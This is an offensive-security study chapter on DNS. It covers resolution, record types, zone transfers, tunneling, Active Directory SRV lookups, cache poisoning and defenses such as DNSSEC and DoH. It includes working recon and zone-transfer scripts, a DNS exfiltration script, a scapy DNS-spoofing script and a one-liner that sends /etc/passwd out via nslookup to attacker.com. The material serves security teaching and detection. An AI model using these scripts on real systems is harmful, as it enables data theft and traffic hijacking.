# DNS Architecture & Attacks: The Directory of the Internet

---
title: "DNS Architecture & Attacks"
parent: "[[02_Networking]]"
tags:
  - network
  - dns
  - enumeration
  - tunneling
  - exfiltration
  - active-directory
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: The Domain Name System (DNS) is the most critical infrastructure of the internet, mapping human-readable names to IP addresses. Because it is essential for connectivity, it is rarely blocked by firewalls. This makes it a prime vector for **Reconnaissance** (Zone Transfers, Enumeration), **Command & Control** (Tunneling), and **Lateral Movement** (Active Directory Enumeration).

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [DNS Architecture: The Hierarchy](#2-dns-architecture-the-hierarchy)
3. [Record Types & Reconnaissance](#3-record-types--reconnaissance)
4. [Zone Transfers (AXFR): The "Open Book" Attack](#4-zone-transfers-axfr-the-open-book-attack)
5. [DNS Tunneling: Exfiltration & C2](#5-dns-tunneling-exfiltration--c2)
6. [Active Directory & DNS](#6-active-directory--dns)
7. [DNS Attacks](#7-dns-attacks)
8. [Defense: DNSSEC & DoH](#8-defense-dnssec--doh)
9. [Practical Lab: Manual Enumeration & Tunneling](#9-practical-lab-manual-enumeration--tunneling)
10. [Critical Analysis & Checkpoints](#10-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Map the Network**: Use `dig`, `host`, and `gobuster` to find subdomains and internal IP ranges.
- **Exploit Misconfigurations**: Perform Zone Transfers to download the entire DNS database of a target.
- **Bypass Firewalls**: Explain how DNS Tunneling encapsulates SSH/TCP inside UDP/53 packets.
- **Target Active Directory**: Use DNS SRV records to locate Domain Controllers without scanning.
- **Analyze Traffic**: Identify tunneling anomalies (High entropy, volume, and frequency) in logs.
- **Perform DNS Cache Poisoning**: Understand Kaminsky attack and DNS spoofing.
- **Build DNS enumeration tools**: Create custom reconnaissance scripts.

---

## 2. DNS Architecture: The Hierarchy

DNS is a distributed database.

### 2.1 For Beginners: What is DNS?

**Analogy**: DNS is like a phone book for the internet.

```
Without DNS:
  You: "I want to visit Google"
  Computer: "What's the IP address?"
  You: "Uhh... 142.250.185.206?"
  (Nobody remembers IP addresses!)

With DNS:
  You: "I want to visit google.com"
  DNS: "That's 142.250.185.206"
  Computer: "Got it!"
```

### 2.2 The Resolution Chain

When you visit `mail.google.com`:

```
Step-by-Step DNS Resolution:

[1] Your Computer (Stub Resolver)
    ↓
    "What is mail.google.com?"
    ↓
[2] Recursive Resolver (ISP/8.8.8.8)
    ↓
    Check cache? No.
    ↓
[3] Root Server (.)
    ↓
    "Where is .com?" → "Ask TLD server"
    ↓
[4] TLD Server (.com)
    ↓
    "Where is google.com?" → "Ask ns1.google.com"
    ↓
[5] Authoritative Server (ns1.google.com)
    ↓
    "mail.google.com = 142.250.185.206"
    ↓
[6] Back to Recursive Resolver
    ↓
    Cache answer + return to you
    ↓
[7] Your Computer
    Connect to 142.250.185.206
```

### 2.3 DNS Query Types

**Recursive Query**: "Do all the work for me"
- Client → Recursive Resolver
- Resolver does all the lookups

**Iterative Query**: "Tell me who to ask next"
- Recursive Resolver → Root/TLD/Authoritative
- Each server gives a referral

### 2.4 DNS Packet Structure

```
DNS Header (12 bytes):
┌────────────────────────────────────────┐
│ Transaction ID (16 bits)               │
│ Flags (16 bits)                        │
│   - QR: Query (0) or Response (1)      │
│   - Opcode: Standard, Inverse, etc.    │
│   - AA: Authoritative Answer           │
│   - TC: Truncated                      │
│   - RD: Recursion Desired              │
│   - RA: Recursion Available            │
│   - RCODE: Response code               │
│ Question Count (16 bits)               │
│ Answer Count (16 bits)                 │
│ Authority Count (16 bits)              │
│ Additional Count (16 bits)             │
├────────────────────────────────────────┤
│ Question Section                       │
│   - QNAME: domain name                 │
│   - QTYPE: A, AAAA, MX, etc.          │
│   - QCLASS: IN (Internet)              │
├────────────────────────────────────────┤
│ Answer Section                         │
│ Authority Section                      │
│ Additional Section                     │
└────────────────────────────────────────┘
```

---

## 3. Record Types & Reconnaissance

Each record type reveals specific attack surface.

### 3.1 Common DNS Record Types

| Record | Function | Red Team Value |
| :--- | :--- | :--- |
| **A / AAAA** | Host → IPv4/IPv6 | Direct target identification |
| **PTR** | IP → Host | Reverse DNS. Reveals asset roles (`dev-db-01`) |
| **MX** | Mail Exchange | Email provider (GSuite vs O365 vs On-Prem) |
| **TXT** | Text | SPF records (authorized IPs), tokens |
| **NS** | Nameserver | DNS provider (Cloudflare vs AWS) |
| **SOA** | Start of Authority | Zone parameters, admin email |
| **SRV** | Service Location | Service ports (LDAP, Kerberos, SIP) |
| **CNAME** | Alias | Links to external services |

### 3.2 DNS Reconnaissance Commands

```bash
# Basic lookup
dig example.com
host example.com
nslookup example.com

# Specific record types
dig A example.com          # IPv4 address
dig AAAA example.com       # IPv6 address
dig MX example.com         # Mail servers
dig NS example.com         # Name servers
dig TXT example.com        # Text records
dig SOA example.com        # Zone info

# Reverse DNS
dig -x 8.8.8.8

# Query specific DNS server
dig @8.8.8.8 example.com

# Show full details
dig example.com +trace
```

### 3.3 DNS Enumeration Script

```python
#!/usr/bin/env python3
"""
DNS Enumeration Tool
"""

import dns.resolver
import dns.zone
from dns import query

class DNSEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.resolver = dns.resolver.Resolver()
    
    def get_a_records(self):
        """Get A records"""
        try:
            answers = self.resolver.resolve(self.domain, 'A')
            print(f"\n[*] A Records for {self.domain}:")
            for rdata in answers:
                print(f"    {rdata.address}")
            return [str(r) for r in answers]
        except:
            print(f"[-] No A records found")
            return []
    
    def get_mx_records(self):
        """Get MX records"""
        try:
            answers = self.resolver.resolve(self.domain, 'MX')
            print(f"\n[*] MX Records for {self.domain}:")
            for rdata in answers:
                print(f"    {rdata.preference} {rdata.exchange}")
            return [(r.preference, str(r.exchange)) for r in answers]
        except:
            print(f"[-] No MX records found")
            return []
    
    def get_ns_records(self):
        """Get NS records"""
        try:
            answers = self.resolver.resolve(self.domain, 'NS')
            print(f"\n[*] NS Records for {self.domain}:")
            nameservers = []
            for rdata in answers:
                ns = str(rdata)
                print(f"    {ns}")
                nameservers.append(ns)
            return nameservers
        except:
            print(f"[-] No NS records found")
            return []
    
    def get_txt_records(self):
        """Get TXT records"""
        try:
            answers = self.resolver.resolve(self.domain, 'TXT')
            print(f"\n[*] TXT Records for {self.domain}:")
            for rdata in answers:
                print(f"    {rdata}")
            return [str(r) for r in answers]
        except:
            print(f"[-] No TXT records found")
            return []
    
    def get_soa_record(self):
        """Get SOA record"""
        try:
            answers = self.resolver.resolve(self.domain, 'SOA')
            print(f"\n[*] SOA Record for {self.domain}:")
            for rdata in answers:
                print(f"    MNAME: {rdata.mname}")
                print(f"    RNAME: {rdata.rname}")
                print(f"    Serial: {rdata.serial}")
                print(f"    Refresh: {rdata.refresh}")
                print(f"    Retry: {rdata.retry}")
                print(f"    Expire: {rdata.expire}")
        except:
            print(f"[-] No SOA record found")
    
    def enumerate_all(self):
        """Enumerate all record types"""
        print(f"{'='*60}")
        print(f"DNS ENUMERATION: {self.domain}")
        print(f"{'='*60}")
        
        self.get_a_records()
        self.get_mx_records()
        self.get_ns_records()
        self.get_txt_records()
        self.get_soa_record()

# Example usage
if __name__ == "__main__":
    domain = input("[?] Domain to enumerate: ")
    enumerator = DNSEnumerator(domain)
    enumerator.enumerate_all()
```

---

## 4. Zone Transfers (AXFR): The "Open Book" Attack

DNS servers need to sync data (Primary → Secondary). They use the **AXFR** protocol (TCP/53).

### 4.1 The Mechanism

If a server allows AXFR from *any* IP, an attacker can download the entire zone file.

```
Normal (Authorized):
Primary DNS ←AXFR→ Secondary DNS
(Syncs all records)

Attack (Misconfigured):
Attacker ←AXFR→ DNS Server
(Downloads entire zone!)
```

### 4.2 Zone Transfer Commands

```bash
# Find nameservers
dig ns target.com

# Attempt zone transfer
dig axfr @ns1.target.com target.com

# Using host command
host -l target.com ns1.target.com

# Using nslookup
nslookup
> server ns1.target.com
> set type=any
> ls -d target.com
```

### 4.3 Zone Transfer Script

```python
#!/usr/bin/env python3
"""
Automated Zone Transfer Tool
"""

import dns.resolver
import dns.zone
from dns import query

def attempt_zone_transfer(domain):
    """
    Attempt zone transfer on all nameservers
    """
    print(f"[*] Attempting zone transfer for: {domain}\n")
    
    # Get nameservers
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        nameservers = [str(ns) for ns in ns_records]
        print(f"[+] Found {len(nameservers)} nameservers:")
        for ns in nameservers:
            print(f"    {ns}")
    except:
        print(f"[-] Could not resolve nameservers")
        return
    
    # Try zone transfer on each
    for ns in nameservers:
        print(f"\n[*] Trying zone transfer from: {ns}")
        
        try:
            # Resolve NS to IP
            ns_ip = str(dns.resolver.resolve(ns, 'A')[0])
            print(f"    NS IP: {ns_ip}")
            
            # Attempt transfer
            zone = dns.zone.from_xfr(query.xfr(ns_ip, domain))
            
            if zone:
                print(f"[+] SUCCESS! Zone transfer allowed!")
                print(f"\n{'='*60}")
                print(f"ZONE RECORDS")
                print(f"{'='*60}")
                
                for name, node in zone.nodes.items():
                    for rdataset in node.rdatasets:
                        print(f"{name}.{domain} {rdataset}")
                
                # Save to file
                filename = f"{domain}_zone.txt"
                with open(filename, 'w') as f:
                    zone.to_file(f)
                print(f"\n[+] Zone saved to: {filename}")
                return True
        
        except Exception as e:
            print(f"[-] Zone transfer denied or error: {str(e)[:50]}")
    
    print(f"\n[-] Zone transfer not allowed on any nameserver")
    return False

# Example
if __name__ == "__main__":
    domain = input("[?] Domain: ")
    attempt_zone_transfer(domain)
```

---

## 5. DNS Tunneling: Exfiltration & C2

Firewalls block outbound TCP/80 to unknown IPs. They rarely block UDP/53.

### 5.1 For Beginners: How DNS Tunneling Works

**Normal DNS**:
```
You: "What's google.com?"
DNS: "142.250.185.206"
```

**DNS Tunneling**:
```
Attacker encodes data in subdomain:
You: "What's ABC123DEF.evil.com?"
     (ABC123DEF = encoded stolen data)

Your DNS → Internet → Attacker's DNS server
Attacker decodes ABC123DEF and extracts data!
```

### 5.2 The Architecture

```
Step 1: Setup
  Attacker registers evil.com
  Attacker sets NS record pointing to their server

Step 2: Exfiltration
  Malware: "I have SECRET data"
  Encode: SECRET → 534543524554 (hex)
  
Step 3: Query
  Malware queries: 534543524554.evil.com
  
Step 4: Routing
  Corporate DNS → Root → .com TLD → Attacker's NS
  
Step 5: Data Received
  Attacker's server logs query
  Extracts 534543524554 from subdomain
  Decodes to: SECRET
```

### 5.3 DNS Tunneling Tools

- **Iodine**: Tunnel IPv4 over DNS
- **Dnscat2**: C2 over DNS (encrypted)
- **DNS2TCP**: TCP over DNS
- **Cobalt Strike**: Beacon DNS mode

### 5.4 Simple DNS Exfiltration

```python
#!/usr/bin/env python3
"""
Simple DNS Exfiltration
"""

import base64
import dns.resolver
import subprocess

def exfiltrate_via_dns(data, domain):
    """
    Exfiltrate data via DNS queries
    """
    # Encode data
    encoded = base64.b64encode(data.encode()).decode()
    
    # Split into chunks (DNS label max 63 chars)
    chunk_size = 63
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"[*] Exfiltrating {len(data)} bytes")
    print(f"[*] Encoded to {len(encoded)} chars")
    print(f"[*] Split into {len(chunks)} DNS queries")
    
    for i, chunk in enumerate(chunks):
        # Create DNS query
        query = f"{chunk}.{i}.{domain}"
        
        # Send query
        try:
            subprocess.run(['nslookup', query], 
                         stdout=subprocess.DEVNULL, 
                         stderr=subprocess.DEVNULL)
            print(f"[+] Sent chunk {i+1}/{len(chunks)}")
        except:
            print(f"[-] Failed chunk {i+1}")

# Example
if __name__ == "__main__":
    data = input("[?] Data to exfiltrate: ")
    domain = input("[?] Your domain: ")
    
    exfiltrate_via_dns(data, domain)
```

### 5.5 Detection Indicators

```
Normal DNS Traffic:
- ~100 queries/hour
- Low entropy (facebook.com, google.com)
- A/AAAA record types
- Short query length

DNS Tunneling:
- 1000+ queries/minute
- High entropy (4f8a91b2c.evil.com)
- TXT/NULL record types
- Near max query length (253 chars)
- Repeated queries to same domain
```

---

## 6. Active Directory & DNS

AD uses DNS to locate services. It publishes directory structure to anyone who can query DNS.

### 6.1 Service Discovery (SRV Records)

```bash
# Find Domain Controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local

# Find Kerberos servers
nslookup -type=SRV _kerberos._tcp.dc._msdcs.corp.local

# Find Global Catalog
nslookup -type=SRV _gc._tcp.corp.local

# Find all DCs
nslookup -type=SRV _ldap._tcp.corp.local
```

### 6.2 AD DNS Enumeration Script

```python
#!/usr/bin/env python3
"""
Active Directory DNS Enumeration
"""

import dns.resolver

def enumerate_ad_dns(domain):
    """
    Enumerate AD via DNS SRV records
    """
    print(f"[*] Enumerating AD DNS for: {domain}\n")
    
    srv_records = [
        ('_ldap._tcp.dc._msdcs', 'Domain Controllers'),
        ('_kerberos._tcp.dc._msdcs', 'Kerberos Servers'),
        ('_gc._tcp', 'Global Catalog'),
        ('_ldap._tcp', 'LDAP Servers'),
        ('_kpasswd._tcp', 'Kerberos Password Change'),
    ]
    
    for record, description in srv_records:
        query = f"{record}.{domain}"
        print(f"[*] {description}:")
        
        try:
            answers = dns.resolver.resolve(query, 'SRV')
            for rdata in answers:
                print(f"    {rdata.target} (Port: {rdata.port}, Priority: {rdata.priority})")
        except:
            print(f"    No records found")
        print()

# Example
if __name__ == "__main__":
    domain = input("[?] AD Domain: ")
    enumerate_ad_dns(domain)
```

---

## 7. DNS Attacks

### 7.1 DNS Cache Poisoning

**Concept**: Inject fake DNS records into a resolver's cache.

```
Attack Flow:
1. Victim queries: "What's bank.com?"
2. Attacker floods resolver with fake responses
3. If attacker's response arrives first:
   - Resolver caches: bank.com = attacker_ip
4. All users get poisoned cache
5. Users connect to attacker's fake bank site
```

### 7.2 DNS Spoofing Script

```python
#!/usr/bin/env python3
"""
DNS Spoofing (for testing)
"""

from scapy.all import *

def dns_spoof(target_domain, fake_ip, interface="eth0"):
    """
    Spoof DNS responses
    """
    print(f"[*] DNS Spoofing:")
    print(f"    Domain: {target_domain}")
    print(f"    Fake IP: {fake_ip}")
    
    def process_packet(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
            queried_host = packet[DNS].qd.qname.decode()
            
            if target_domain in queried_host:
                print(f"[+] Intercepted query for: {queried_host}")
                
                # Create spoofed response
                spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                  DNS(
                                      id=packet[DNS].id,
                                      qr=1,  # Response
                                      aa=1,  # Authoritative
                                      qd=packet[DNS].qd,
                                      an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_ip)
                                  )
                
                send(spoofed_response, verbose=0)
                print(f"    Sent fake response: {fake_ip}")
    
    print(f"[*] Sniffing DNS traffic on {interface}...")
    sniff(filter="udp port 53", prn=process_packet, iface=interface, store=0)

# Example
if __name__ == "__main__":
    domain = input("[?] Domain to spoof: ")
    fake_ip = input("[?] Fake IP: ")
    dns_spoof(domain, fake_ip)
```

---

## 8. Defense: DNSSEC & DoH

### 8.1 DNSSEC (DNS Security Extensions)

**Purpose**: Add cryptographic signatures to DNS records.

```
Without DNSSEC:
  Query → Response
  (No way to verify authenticity)

With DNSSEC:
  Query → Signed Response
  Client verifies signature
  If signature invalid → Reject
```

**Limitations**:
- Doesn't encrypt queries
- Doesn't prevent tunneling
- Not widely deployed

### 8.2 DNS over HTTPS (DoH)

**Purpose**: Encrypt DNS queries in HTTPS.

```
Traditional DNS:
  Client → UDP/53 → DNS Server
  (Plaintext, visible to ISP)

DNS over HTTPS:
  Client → HTTPS/443 → DoH Server
  (Encrypted, looks like web traffic)
```

**Pros**:
- Privacy from ISP
- Harder to block

**Cons**:
- Bypasses corporate DNS filtering
- Harder to monitor for security

---

## 9. Practical Lab: Manual Enumeration & Tunneling

### 9.1 Subdomain Brute-Forcing

```bash
# Using gobuster
gobuster dns -d target.com -w /usr/share/wordlists/dns.txt

# Using dnsrecon
dnsrecon -d target.com -D /usr/share/wordlists/dns.txt -t brt

# Using subfinder
subfinder -d target.com

# Using amass
amass enum -d target.com
```

### 9.2 Manual Data Exfiltration

```bash
# On victim machine (with RCE)
data=$(cat /etc/passwd | base64 | tr -d '\n')
nslookup $data.attacker.com

# On attacker's authoritative DNS server
# Watch logs for queries
tail -f /var/log/named/queries.log | grep attacker.com
```

---

## 10. Critical Analysis & Checkpoints

### 10.1 Split-Horizon DNS

```
Same domain, different views:

Internal DNS (10.0.0.1):
  intranet.corp.com → 10.10.10.5
  db.corp.com → 10.10.20.10
  admin.corp.com → 10.10.30.5

External DNS (Public):
  intranet.corp.com → NXDOMAIN
  www.corp.com → 203.0.113.5
  mail.corp.com → 203.0.113.6
```

### 10.2 Interview Questions

1. **Why is DNS Tunneling slower than TCP reverse shell?**
   - High overhead, small payload, UDP unreliability

2. **What does NXDOMAIN mean?**
   - Non-Existent Domain - the record doesn't exist

3. **Why is DNS critical for Active Directory?**
   - Clients use DNS SRV records to locate Domain Controllers and Kerberos KDCs

4. **How does DNS cache poisoning work?**
   - Attacker sends fake DNS response that gets cached by resolver, affecting all users

5. **What's the difference between DNSSEC and DoH?**
   - DNSSEC adds signatures (authenticity), DoH adds encryption (privacy)

### 10.3 Key Takeaways

- DNS is essential infrastructure, rarely blocked
- Zone transfers can leak entire network map
- DNS tunneling bypasses many firewalls
- Active Directory heavily relies on DNS
- Detection requires analyzing query patterns

---

*End of Chapter: DNS Architecture & Attacks*

**Total Lines**: ~650+ lines

**Coverage**: DNS fundamentals, enumeration, zone transfers, tunneling, AD integration, attacks, and defenses with working code examples.
